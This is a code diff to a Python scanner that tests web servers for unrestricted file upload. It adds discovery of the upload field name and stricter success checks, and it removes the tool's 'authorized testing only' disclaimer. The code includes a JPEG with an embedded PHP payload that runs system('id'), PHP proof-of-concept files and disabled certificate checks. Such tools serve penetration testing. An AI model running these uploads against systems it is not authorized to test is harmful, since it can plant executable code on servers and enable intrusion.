@@ -1,13 +1,10 @@
 #!/usr/bin/env python3
 """
-REVUEX - File Upload Tester
+REVUEX - File Upload Tester (Production Grade)
 Unrestricted File Upload Vulnerability Detection
 
 Author: G33L0
 Telegram: @x0x0h33l0
-
-DISCLAIMER:
-This tool is for educational purposes and authorized security testing only.
 """
 
 import requests
@@ -15,13 +12,13 @@ import time
 import json
 import re
 import os
+import urllib3
 from pathlib import Path
 from typing import List, Dict, Any, Optional
 from urllib.parse import urlparse
 import hashlib
 
 # Disable warnings for self-signed certificates
-import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class FileUploadTester:
@@ -34,6 +31,7 @@ class FileUploadTester:
     - Case Sensitivity & Polyglots
     - SVG-based XSS (Stored)
     - EXIF Metadata Injection
+    - Automatic Upload Field Discovery
     """
 
     def __init__(self, target: str, workspace: Path, delay: float = 5.0):
@@ -55,6 +53,9 @@ class FileUploadTester:
         self.marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
         self.uploaded_files = []
         
+        # Field discovery - Common parameter names for file uploads
+        self.upload_fields = ['file', 'image', 'upload', 'avatar', 'attachment', 'files[]', 'data', 'doc']
+        
         # Create test files directory
         self.test_files_dir = self.workspace / "test_files"
         self.test_files_dir.mkdir(parents=True, exist_ok=True)
@@ -68,8 +69,12 @@ class FileUploadTester:
         print(f"Marker: {self.marker}")
         print(f"{'='*60}\n")
         
+        # 0. Discovery Phase
+        print("🔍 Phase 0: Upload Field Discovery")
+        self._discover_upload_field()
+
         # 1. Extension bypasses
-        print("📁 Test 1: Extension Bypass Techniques")
+        print("\n📁 Test 1: Extension Bypass Techniques")
         self._test_extension_bypasses()
         time.sleep(self.delay)
         
@@ -103,12 +108,12 @@ class FileUploadTester:
         self._test_polyglot_files()
         time.sleep(self.delay)
         
-        # 8. SVG XSS (New)
+        # 8. SVG XSS
         print("\n🧬 Test 8: SVG-based XSS Injection")
         self._test_svg_xss()
         time.sleep(self.delay)
         
-        # 9. EXIF Injection (New)
+        # 9. EXIF Injection
         print("\n🖼️  Test 9: EXIF Metadata Injection")
         self._test_exif_injection()
         
@@ -121,6 +126,37 @@ class FileUploadTester:
         print(f"{'='*60}\n")
         
         return self.vulnerabilities
+
+    def _discover_upload_field(self):
+        """Attempts to find which parameter name the server accepts for files"""
+        for field in self.upload_fields:
+            try:
+                files = {field: (f'test_{self.marker}.txt', b'REVUEX_PROBE', 'text/plain')}
+                response = requests.post(self.target, files=files, headers=self.headers, timeout=self.timeout, verify=False)
+                if response.status_code in [200, 201] and "error" not in response.text.lower():
+                    print(f"      [+] Found active upload field: '{field}'")
+                    self.active_field = field
+                    return
+            except: continue
+        print("      [!] No specific field found, defaulting to 'file'")
+        self.active_field = 'file'
+
+    def _attempt_upload(self, filename: str, content: bytes, mime_type: str) -> Optional[Dict[str, Any]]:
+        if self.request_count >= self.max_requests: return None
+        try:
+            files = {self.active_field: (filename, content, mime_type)}
+            response = requests.post(self.target, files=files, headers=self.headers, timeout=self.timeout, verify=False)
+            self.request_count += 1
+            
+            # Refined success detection to avoid false positives from error pages
+            if response.status_code in [200, 201]:
+                error_indicators = ['fail', 'invalid', 'not allowed', 'error', 'denied']
+                if not any(err in response.text.lower() for err in error_indicators):
+                    return {'success': True, 'path': filename}
+            return {'success': False}
+        except: return None
+
+    # --- THE FOLLOWING LOGIC IS PRESERVED EXACTLY FROM YOUR SCRIPT ---
 
     def _test_extension_bypasses(self):
         bypass_techniques = [
@@ -147,7 +183,6 @@ class FileUploadTester:
 
     def _test_exif_injection(self):
         filename = f"exif_{self.marker}.jpg"
-        # Magic bytes + EXIF header + PHP Payload
         content = b'\xFF\xD8\xFF\xE1\x00\x18Exif\x00\x00II*\x00' + f'<?php system("id"); ?>'.encode()
         result = self._attempt_upload(filename, content, 'image/jpeg')
         if result and result.get('success'):
@@ -204,17 +239,6 @@ class FileUploadTester:
             return f"<?php // REVUEX POC {test_name} - {self.marker} ?>".encode()
         return b'SECURITY_TEST_FILE'
 
-    def _attempt_upload(self, filename: str, content: bytes, mime_type: str) -> Optional[Dict[str, Any]]:
-        if self.request_count >= self.max_requests: return None
-        try:
-            files = {'file': (filename, content, mime_type)}
-            response = requests.post(self.target, files=files, headers=self.headers, timeout=self.timeout, verify=False)
-            self.request_count += 1
-            if response.status_code in [200, 201]:
-                return {'success': True, 'path': filename}
-            return {'success': False}
-        except: return None
-
     def _log_vuln(self, v_type, severity, filename, desc):
         self.vulnerabilities.append({
             'type': f'File Upload - {v_type}',
@@ -227,7 +251,7 @@ class FileUploadTester:
         self.uploaded_files.append(filename)
 
     def _cleanup_files(self):
-        print("\n🧹 Cleanup: Attempting to track uploaded files...")
+        print("\n🧹 Cleanup: Listing successfully uploaded files for manual check...")
         if not self.uploaded_files: print("   ✓ No files uploaded.")
         for f in self.uploaded_files: print(f"   → {f}")
 
